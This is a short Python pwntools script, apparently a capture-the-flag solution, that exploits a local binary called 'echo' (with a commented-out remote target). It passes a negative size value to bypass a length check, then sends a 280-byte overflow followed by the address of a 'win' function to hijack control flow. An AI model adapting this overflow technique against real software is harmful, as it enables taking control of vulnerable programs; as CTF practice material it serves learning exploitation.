import pwn
import IPython

elf = pwn.ELF('echo')
symbols = elf.symbols

win = symbols['win']
get_data = symbols['get_data']

io = pwn.process('./echo')
# io = pwn.remote('34.170.146.252', '28783')


io.sendlineafter(b'Size: ', b'-2147483648')
io.sendlineafter(b"Data: ", b'0' * 280 + pwn.p32(win))
print(io.recvall())
IPython.embed()

